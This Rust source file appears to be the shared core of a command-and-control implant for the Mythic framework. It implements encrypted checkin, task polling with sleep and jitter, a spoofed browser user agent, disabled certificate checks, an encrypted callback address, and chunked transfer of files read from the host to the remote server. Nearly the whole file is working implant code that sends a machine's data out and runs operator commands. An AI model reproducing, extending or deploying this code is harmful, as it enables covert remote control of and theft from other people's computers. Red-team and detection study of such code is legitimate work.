// link-common — Mythic protocol implementation
//
// Wire format (Mythic standard): base64( UUID(36) + IV(16) + AES-256-CBC(PKCS7(JSON)) + HMAC-SHA256(32) )
// Key: raw 32-byte AES key from AESPSK C2 profile parameter (base64-decoded at runtime).
// HMAC uses the same AES key over (IV + ciphertext).
// CALLBACK address is stored as hex(IV_16 || AES-256-CBC(address) || HMAC_32) — see encrypt_config/decrypt_config.

use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};

pub mod dispatch;

// ── Wire types Mythic ──────────────────────────────────────────────────────────

#[derive(serde::Serialize)]
pub struct CheckinMessage<'a> {
    pub action: &'a str,
    pub uuid: &'a str,
    pub user: String,
    pub host: String,
    pub pid: u32,
    pub ip: String,
    pub os: &'a str,
    pub arch: &'a str,
    pub domain: &'a str,
    pub integrity_level: u8,
    pub extra_info: &'a str,
    pub sleep_info: &'a str,
}

#[derive(serde::Deserialize, Default)]
pub struct CheckinResponse {
    pub action: String,
    pub id: String,
    pub status: String,
}

#[derive(serde::Serialize)]
pub struct GetTaskingMessage<'a> {
    pub action: &'a str,
    pub tasking_size: i32,
}

#[derive(serde::Deserialize, Default, Clone)]
pub struct Task {
    pub id: String,
    pub command: String,
    pub parameters: String,
}

#[derive(serde::Deserialize, Default)]
pub struct GetTaskingResponse {
    pub action: String,
    pub tasks: Vec<Task>,
}

#[derive(serde::Serialize)]
pub struct TaskResponse {
    pub task_id: String,
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub completed: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub user_output: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub download: Option<DownloadRegistration>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub upload: Option<UploadRequest>,
}

#[derive(serde::Serialize)]
pub struct DownloadRegistration {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub total_chunks: Option<i64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub full_path: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_size: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub is_screenshot: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_num: Option<i64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_data: Option<String>,
}

#[derive(serde::Serialize)]
pub struct UploadRequest {
    pub chunk_size: usize,
    pub file_id: String,
    pub chunk_num: i64,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub full_path: Option<String>,
}

#[derive(serde::Deserialize, Default)]
pub struct PostResponseEntry {
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub file_id: String,
    #[serde(default)]
    pub task_id: String,
    #[serde(default)]
    pub error: String,
    #[serde(default)]
    pub total_chunks: i64,
    #[serde(default)]
    pub chunk_num: i64,
    #[serde(default)]
    pub chunk_data: String,
}

#[derive(serde::Deserialize, Default)]
pub struct PostResponse {
    #[serde(default)]
    pub action: String,
    #[serde(default)]
    pub responses: Vec<PostResponseEntry>,
}

#[derive(serde::Serialize)]
pub struct PostResponseMessage<'a> {
    pub action: &'a str,
    pub responses: Vec<TaskResponse>,
}

// ── HTTP client ────────────────────────────────────────────────────────────────

pub fn build_client() -> reqwest::blocking::Client {
    reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .expect("reqwest client init failed")
}

// ── AES-256-CBC + HMAC-SHA256 (Mythic standard) ───────────────────────────────

fn aes_cbc_encrypt(plaintext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    use aes::Aes256;
    use cbc::cipher::{BlockEncryptMut, KeyIvInit};
    use cbc::cipher::block_padding::Pkcs7;
    type Aes256CbcEnc = cbc::Encryptor<Aes256>;

    let enc = Aes256CbcEnc::new(key.into(), iv.into());
    let padded_len = plaintext.len() + (16 - plaintext.len() % 16);
    let mut buf = vec![0u8; padded_len];
    buf[..plaintext.len()].copy_from_slice(plaintext);
    let ct = enc.encrypt_padded_mut::<Pkcs7>(&mut buf, plaintext.len()).expect("encrypt");
    ct.to_vec()
}

fn aes_cbc_decrypt(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Option<Vec<u8>> {
    use aes::Aes256;
    use cbc::cipher::{BlockDecryptMut, KeyIvInit};
    use cbc::cipher::block_padding::Pkcs7;
    type Aes256CbcDec = cbc::Decryptor<Aes256>;

    let dec = Aes256CbcDec::new(key.into(), iv.into());
    let mut buf = ciphertext.to_vec();
    let pt = dec.decrypt_padded_mut::<Pkcs7>(&mut buf).ok()?;
    Some(pt.to_vec())
}

fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC key length");
    mac.update(data);
    mac.finalize().into_bytes().into()
}

/// Decode a base64-encoded 32-byte AES key (from Mythic AESPSK).
pub fn decode_aes_key(b64_key: &str) -> Option<[u8; 32]> {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    let bytes = STANDARD.decode(b64_key).ok()?;
    if bytes.len() != 32 {
        return None;
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    Some(key)
}

/// Build a Mythic wire message: base64( UUID(36) + IV(16) + AES-256-CBC(JSON) + HMAC-SHA256(32) ).
/// Returns an empty string on encryption failure.
pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let iv: [u8; 16] = rand::random();
    let ciphertext = aes_cbc_encrypt(payload_json.as_bytes(), key, &iv);

    let mut iv_ct = Vec::with_capacity(16 + ciphertext.len());
    iv_ct.extend_from_slice(&iv);
    iv_ct.extend_from_slice(&ciphertext);
    let hmac = hmac_sha256(key, &iv_ct);

    let mut msg = Vec::with_capacity(36 + iv_ct.len() + 32);
    msg.extend_from_slice(uuid.as_bytes());
    msg.extend_from_slice(&iv_ct);
    msg.extend_from_slice(&hmac);

    STANDARD.encode(&msg)
}

/// Parse a Mythic wire message: base64-decode, strip UUID, verify HMAC, AES-CBC-decrypt.
pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let blob = STANDARD.decode(raw).ok()?;
    // UUID(36) + IV(16) + at least 16 bytes ciphertext + HMAC(32)
    if blob.len() < 36 + 16 + 16 + 32 {
        return None;
    }

    let body = &blob[36..];
    let hmac_offset = body.len() - 32;
    let iv_ct = &body[..hmac_offset];
    let received_hmac = &body[hmac_offset..];

    let computed_hmac = hmac_sha256(key, iv_ct);
    if computed_hmac != received_hmac {
        return None;
    }

    let iv: [u8; 16] = iv_ct[..16].try_into().ok()?;
    let ciphertext = &iv_ct[16..];
    let plaintext = aes_cbc_decrypt(ciphertext, key, &iv)?;
    String::from_utf8(plaintext).ok()
}

/// Encrypt a config value (CALLBACK address) → hex(IV_16 || ciphertext || HMAC_32).
#[allow(dead_code)]
pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
    let iv: [u8; 16] = rand::random();
    let ciphertext = aes_cbc_encrypt(data.as_bytes(), key, &iv);

    let mut iv_ct = Vec::with_capacity(16 + ciphertext.len());
    iv_ct.extend_from_slice(&iv);
    iv_ct.extend_from_slice(&ciphertext);
    let hmac = hmac_sha256(key, &iv_ct);

    let mut result = Vec::with_capacity(iv_ct.len() + 32);
    result.extend_from_slice(&iv_ct);
    result.extend_from_slice(&hmac);
    hex::encode(result)
}

/// Decrypt a hex(IV_16 || ciphertext || HMAC_32) config blob.
pub fn decrypt_config(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
    let data = hex::decode(enc_hex).ok()?;
    // IV(16) + at least 16 bytes ciphertext + HMAC(32)
    if data.len() < 16 + 16 + 32 {
        return None;
    }

    let hmac_offset = data.len() - 32;
    let iv_ct = &data[..hmac_offset];
    let received_hmac = &data[hmac_offset..];

    let computed_hmac = hmac_sha256(key, iv_ct);
    if computed_hmac != received_hmac {
        return None;
    }

    let iv: [u8; 16] = iv_ct[..16].try_into().ok()?;
    let ciphertext = &iv_ct[16..];
    let plaintext = aes_cbc_decrypt(ciphertext, key, &iv)?;
    String::from_utf8(plaintext).ok()
}

// ── Shared state (sleep / jitter / kill date) ──────────────────────────────────

static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);

pub fn get_sleep_seconds() -> u64 {
    SLEEP_SECONDS.load(Ordering::Relaxed)
}
pub fn set_sleep_seconds(s: u64) {
    SLEEP_SECONDS.store(s, Ordering::Relaxed);
}
pub fn get_jitter_percent() -> u32 {
    JITTER_PERCENT.load(Ordering::Relaxed)
}
pub fn set_jitter_percent(p: u32) {
    JITTER_PERCENT.store(p.min(100), Ordering::Relaxed);
}
pub fn get_kill_date() -> Option<i64> {
    let v = KILL_DATE.load(Ordering::Relaxed);
    if v == i64::MIN {
        None
    } else {
        Some(v)
    }
}
pub fn set_kill_date(ts: Option<i64>) {
    KILL_DATE.store(ts.unwrap_or(i64::MIN), Ordering::Relaxed);
}
pub fn should_exit() -> bool {
    if let Some(kd) = get_kill_date() {
        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            return now.as_secs() as i64 > kd;
        }
    }
    false
}

// ── Timing ─────────────────────────────────────────────────────────────────────

pub fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

pub fn sleep_with_jitter(base: u64, jitter_pct: u32) {
    if jitter_pct == 0 || base == 0 {
        return sleep(base);
    }
    let range = base * jitter_pct as u64 / 100;
    if range == 0 {
        return sleep(base);
    }
    let offset = rand::random::<u64>() % (2 * range + 1);
    let t = base.saturating_sub(range).saturating_add(offset);
    sleep(t.max(1));
}

// ── Shared helpers ─────────────────────────────────────────────────────────────

pub fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

/// Extract a single value from a Mythic parameters JSON object.
/// Falls back to the raw string if the key is absent or if input is not valid JSON.
/// Handles both string and number JSON values.
/// Example: extract_param(r#"{"path": "/tmp"}"#, "path") → "/tmp"
/// Example: extract_param(r#"{"seconds": 30}"#, "seconds") → "30"
pub fn extract_param(parameters: &str, key: &str) -> String {
    serde_json::from_str::<serde_json::Value>(parameters)
        .ok()
        .and_then(|v| {
            let val = v.get(key)?;
            Some(match val {
                serde_json::Value::String(s) => s.clone(),
                serde_json::Value::Number(n) => n.to_string(),
                _ => val.to_string(),
            })
        })
        .unwrap_or_default()
}

pub fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => {
            let mut items: Vec<String> = entries
                .flatten()
                .map(|e| {
                    let name = e.file_name().to_string_lossy().into_owned();
                    if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                        format!("{}/", name)
                    } else {
                        name
                    }
                })
                .collect();
            items.sort();
            items.join("\n")
        }
        Err(e) => format!("[-] {}", e),
    }
}

const CHUNK_SIZE: usize = 512_000;

/// Send a post_response message to Mythic and parse the response entries.
fn send_post_response(
    client: &reqwest::blocking::Client,
    base_url: &str,
    uri: &str,
    callback_id: &str,
    key: &[u8; 32],
    responses: Vec<TaskResponse>,
) -> Vec<PostResponseEntry> {
    let msg = PostResponseMessage {
        action: "post_response",
        responses,
    };
    let json = serde_json::to_string(&msg).unwrap_or_default();
    let wire = build_mythic_message(callback_id, &json, key);

    client
        .post(format!("{}{}", base_url, uri))
        .body(wire)
        .header("Content-Type", "application/octet-stream")
        .send()
        .ok()
        .and_then(|r| r.text().ok())
        .and_then(|raw| parse_mythic_message(&raw, key))
        .and_then(|j| serde_json::from_str::<PostResponse>(&j).ok())
        .map(|r| r.responses)
        .unwrap_or_default()
}

/// Download a file from the agent to Mythic using chunked transfer protocol.
pub fn mythic_download(
    client: &reqwest::blocking::Client,
    base_url: &str,
    uri: &str,
    callback_id: &str,
    key: &[u8; 32],
    task_id: &str,
    path: &str,
) -> String {
    if path.is_empty() {
        return "[-] Usage: download <path>".into();
    }
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => return format!("[-] {}", e),
    };

    let full_path = std::fs::canonicalize(path)
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| path.to_string());

    let total_chunks = ((data.len() as f64) / CHUNK_SIZE as f64).ceil() as i64;
    let total_chunks = total_chunks.max(1);

    // Step 1: Register the download with Mythic
    let reg = TaskResponse {
        task_id: task_id.to_string(),
        completed: false,
        user_output: None,
        status: None,
        download: Some(DownloadRegistration {
            total_chunks: Some(total_chunks),
            full_path: Some(full_path.clone()),
            chunk_size: Some(CHUNK_SIZE),
            is_screenshot: Some(false),
            chunk_num: None,
            file_id: None,
            chunk_data: None,
        }),
        upload: None,
    };
    let resp = send_post_response(client, base_url, uri, callback_id, key, vec![reg]);
    let file_id = match resp.first() {
        Some(e) if e.status == "success" && !e.file_id.is_empty() => e.file_id.clone(),
        _ => return "[-] Failed to register download with Mythic".into(),
    };

    // Step 2: Send chunks
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    for chunk_num in 1..=total_chunks {
        let start = ((chunk_num - 1) as usize) * CHUNK_SIZE;
        let end = (start + CHUNK_SIZE).min(data.len());
        let chunk_data = STANDARD.encode(&data[start..end]);

        let chunk_resp = TaskResponse {
            task_id: task_id.to_string(),
            completed: chunk_num == total_chunks,
            user_output: if chunk_num == total_chunks {
                Some(format!("[+] Downloaded {} ({} bytes)", full_path, data.len()))
            } else {
                None
            },
            status: None,
            download: Some(DownloadRegistration {
                total_chunks: None,
                full_path: None,
                chunk_size: None,
                is_screenshot: None,
                chunk_num: Some(chunk_num),
                file_id: Some(file_id.clone()),
                chunk_data: Some(chunk_data),
            }),
            upload: None,
        };
        let resp = send_post_response(client, base_url, uri, callback_id, key, vec![chunk_resp]);
        if resp.first().map(|e| e.status.as_str()) != Some("success") {
            return format!("[-] Chunk {} upload failed", chunk_num);
        }
    }
    format!("[+] Downloaded {} ({} bytes)", full_path, data.len())
}

/// Upload a file from Mythic to the agent using chunked transfer protocol.
pub fn mythic_upload(
    client: &reqwest::blocking::Client,
    base_url: &str,
    uri: &str,
    callback_id: &str,
    key: &[u8; 32],
    task_id: &str,
    file_id: &str,
    dest_path: &str,
) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    if file_id.is_empty() || dest_path.is_empty() {
        return "[-] upload requires file and remote_path parameters".into();
    }

    let full_path = if dest_path.starts_with('/') || dest_path.starts_with('\\') {
        dest_path.to_string()
    } else {
        std::env::current_dir()
            .map(|d| d.join(dest_path).display().to_string())
            .unwrap_or_else(|_| dest_path.to_string())
    };

    // Request first chunk to get total_chunks
    let req = TaskResponse {
        task_id: task_id.to_string(),
        completed: false,
        user_output: None,
        status: None,
        download: None,
        upload: Some(UploadRequest {
            chunk_size: CHUNK_SIZE,
            file_id: file_id.to_string(),
            chunk_num: 1,
            full_path: Some(full_path.clone()),
        }),
    };
    let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
    let first = match resp.first() {
        Some(e) if e.status == "success" => e,
        Some(e) => return format!("[-] Upload failed: {}", e.error),
        None => return "[-] No response from Mythic for upload".into(),
    };

    let total_chunks = first.total_chunks;
    let mut file_data = match STANDARD.decode(&first.chunk_data) {
        Ok(d) => d,
        Err(e) => return format!("[-] Chunk 1 decode error: {}", e),
    };

    // Request remaining chunks
    for chunk_num in 2..=total_chunks {
        let req = TaskResponse {
            task_id: task_id.to_string(),
            completed: false,
            user_output: None,
            status: None,
            download: None,
            upload: Some(UploadRequest {
                chunk_size: CHUNK_SIZE,
                file_id: file_id.to_string(),
                chunk_num,
                full_path: None,
            }),
        };
        let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
        match resp.first() {
            Some(e) if e.status == "success" => {
                match STANDARD.decode(&e.chunk_data) {
                    Ok(d) => file_data.extend_from_slice(&d),
                    Err(e) => return format!("[-] Chunk {} decode error: {}", chunk_num, e),
                }
            }
            _ => return format!("[-] Chunk {} fetch failed", chunk_num),
        }
    }

    match std::fs::write(&full_path, &file_data) {
        Ok(()) => format!("[+] Uploaded {} ({} bytes)", full_path, file_data.len()),
        Err(e) => format!("[-] Write error: {}", e),
    }
}

// Keep simple versions for non-networked tests / fallback
pub fn download_file(path: &str) -> String {
    if path.is_empty() {
        return "[-] Usage: download <path>".into();
    }
    match std::fs::read(path) {
        Ok(buf) => format!("[+] File read: {} ({} bytes)", path, buf.len()),
        Err(e) => format!("[-] {}", e),
    }
}

pub fn upload_file(_args: &str) -> String {
    "[-] Upload requires Mythic file transfer protocol".into()
}

pub fn handle_sleep_command(args: &str) -> String {
    if args.is_empty() {
        return format!(
            "sleep: {}s, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }
    let parts: Vec<&str> = args.split_whitespace().collect();
    if let Ok(s) = parts[0].parse::<u64>() {
        set_sleep_seconds(s);
        if parts.len() > 1 {
            if let Ok(j) = parts[1].parse::<u32>() {
                set_jitter_percent(j);
            }
        }
        return format!(
            "[+] sleep: {}s, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }
    "[-] Usage: sleep <seconds> [jitter%]".into()
}

pub fn handle_killdate_command(args: &str) -> String {
    if args.is_empty() {
        return match get_kill_date() {
            Some(ts) => format!("killdate: {}", ts),
            None => "no killdate set".into(),
        };
    }
    if args.to_lowercase() == "clear" {
        set_kill_date(None);
        return "[+] killdate cleared".into();
    }
    if let Ok(ts) = args.parse::<i64>() {
        set_kill_date(Some(ts));
        return format!("[+] killdate: {}", ts);
    }
    "[-] Usage: killdate <unix_timestamp|clear>".into()
}

// ── C2 loop ────────────────────────────────────────────────────────────────────

pub struct RegisterInfo {
    pub user: String,
    pub host: String,
    pub ip: String,
    pub os: &'static str,
    pub arch: &'static str,
    pub pid: u32,
    pub integrity_level: u8,
}

pub fn run_c2_loop<F>(
    callback: &str,
    implant_secret: &str,
    payload_uuid: &str,
    callback_uri: &str,
    reg: RegisterInfo,
    dispatch: F,
) where
    F: Fn(&str, &str) -> String,
{
    use zeroize::Zeroize;

    let mut encryption_key = match decode_aes_key(implant_secret) {
        Some(k) => k,
        None => return,
    };
    let decrypted_callback =
        decrypt_config(callback, &encryption_key).unwrap_or_else(|| callback.to_string());

    let client = build_client();
    let base = if decrypted_callback.starts_with("http") {
        decrypted_callback.to_string()
    } else {
        format!("https://{}", decrypted_callback)
    };
    let uri = if callback_uri.is_empty() { "/" } else { callback_uri };

    // ── Checkin ───────────────────────────────────────────────────────────────
    let checkin = CheckinMessage {
        action: "checkin",
        uuid: payload_uuid,
        user: reg.user.clone(),
        host: reg.host.clone(),
        pid: reg.pid,
        ip: reg.ip,
        os: reg.os,
        arch: reg.arch,
        domain: "",
        integrity_level: reg.integrity_level,
        extra_info: "",
        sleep_info: "",
    };

    let checkin_json = serde_json::to_string(&checkin).unwrap_or_default();
    let checkin_msg = build_mythic_message(payload_uuid, &checkin_json, &encryption_key);

    #[allow(unused_assignments)]
    let mut callback_id = String::new();
    let mut retry_delay: u64 = 5;

    loop {
        if should_exit() {
            return;
        }
        if let Ok(resp) = client
            .post(format!("{}{}", base, uri))
            .body(checkin_msg.clone())
            .header("Content-Type", "application/octet-stream")
            .send()
        {
            if let Ok(raw) = resp.text() {
                if let Some(json) = parse_mythic_message(&raw, &encryption_key) {
                    if let Ok(cr) = serde_json::from_str::<CheckinResponse>(&json) {
                        if cr.status == "success" {
                            callback_id = cr.id;
                            break;
                        }
                    }
                }
            }
        }
        sleep_with_jitter(retry_delay, 30);
        retry_delay = (retry_delay * 2).min(60);
    }

    // ── Polling loop ──────────────────────────────────────────────────────────
    loop {
        if should_exit() {
            break;
        }

        let get_tasking = GetTaskingMessage {
            action: "get_tasking",
            tasking_size: -1,
        };
        let get_json = serde_json::to_string(&get_tasking).unwrap_or_default();
        let get_msg = build_mythic_message(&callback_id, &get_json, &encryption_key);

        let tasks: Vec<Task> = match client
            .post(format!("{}{}", base, uri))
            .body(get_msg)
            .header("Content-Type", "application/octet-stream")
            .send()
            .and_then(|r| r.text())
        {
            Ok(raw) => parse_mythic_message(&raw, &encryption_key)
                .and_then(|j| serde_json::from_str::<GetTaskingResponse>(&j).ok())
                .map(|r| r.tasks)
                .unwrap_or_default(),
            Err(_) => {
                sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
                continue;
            }
        };

        if tasks.is_empty() {
            sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
            continue;
        }

        let mut responses = Vec::new();
        for task in &tasks {
            if task.command == "exit" {
                encryption_key.zeroize();
                return;
            }

            // Download and upload use Mythic's chunked file transfer protocol
            // and require multiple round-trips — handle them outside of dispatch.
            if task.command == "download" {
                let path = extract_param(&task.parameters, "path");
                let output = mythic_download(
                    &client, &base, uri, &callback_id, &encryption_key,
                    &task.id, &path,
                );
                let is_error = output.starts_with("[-]");
                responses.push(TaskResponse {
                    task_id: task.id.clone(),
                    completed: true,
                    user_output: Some(output),
                    status: if is_error { Some("error".to_string()) } else { None },
                    download: None,
                    upload: None,
                });
                continue;
            }
            if task.command == "upload" {
                let file_id = extract_param(&task.parameters, "file");
                let dest = extract_param(&task.parameters, "remote_path");
                let output = mythic_upload(
                    &client, &base, uri, &callback_id, &encryption_key,
                    &task.id, &file_id, &dest,
                );
                let is_error = output.starts_with("[-]");
                responses.push(TaskResponse {
                    task_id: task.id.clone(),
                    completed: true,
                    user_output: Some(output),
                    status: if is_error { Some("error".to_string()) } else { None },
                    download: None,
                    upload: None,
                });
                continue;
            }

            let output = dispatch(&task.command, &task.parameters);
            let is_error = output.starts_with("[-]");
            responses.push(TaskResponse {
                task_id: task.id.clone(),
                completed: true,
                user_output: Some(output),
                status: if is_error { Some("error".to_string()) } else { None },
                download: None,
                upload: None,
            });
        }

        let post_resp = PostResponseMessage {
            action: "post_response",
            responses,
        };
        let post_json = serde_json::to_string(&post_resp).unwrap_or_default();
        let post_msg = build_mythic_message(&callback_id, &post_json, &encryption_key);

        let _ = client
            .post(format!("{}{}", base, uri))
            .body(post_msg)
            .header("Content-Type", "application/octet-stream")
            .send();

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }

    encryption_key.zeroize();
}

// ── Tests ──────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn test_key() -> [u8; 32] {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        h.update(b"test-secret");
        let hash = h.finalize();
        let mut key = [0u8; 32];
        key.copy_from_slice(&hash);
        key
    }

    #[test]
    fn test_mythic_wire_roundtrip() {
        let key = test_key();
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
        let payload = r#"{"action":"get_tasking","tasking_size":-1}"#;

        let wire = build_mythic_message(uuid, payload, &key);
        assert!(!wire.is_empty());

        let recovered = parse_mythic_message(&wire, &key).unwrap();
        assert_eq!(recovered, payload);
    }

    #[test]
    fn test_mythic_wire_wrong_key_returns_none() {
        let key = test_key();
        let mut wrong_key = [0u8; 32];
        wrong_key[0] = 0xFF;
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

        let wire = build_mythic_message(uuid, "hello", &key);
        assert!(parse_mythic_message(&wire, &wrong_key).is_none());
    }

    #[test]
    fn test_config_roundtrip() {
        let key = test_key();
        let addr = "192.168.1.10:443";

        let enc = encrypt_config(addr, &key);
        let dec = decrypt_config(&enc, &key).unwrap();
        assert_eq!(dec, addr);
    }

    #[test]
    fn test_decode_aes_key() {
        use base64::{engine::general_purpose::STANDARD, Engine as _};
        let key = [42u8; 32];
        let b64 = STANDARD.encode(key);
        let decoded = decode_aes_key(&b64).unwrap();
        assert_eq!(decoded, key);
    }

    #[test]
    fn test_decode_aes_key_invalid_length() {
        use base64::{engine::general_purpose::STANDARD, Engine as _};
        let short = STANDARD.encode([0u8; 16]);
        assert!(decode_aes_key(&short).is_none());
    }
}
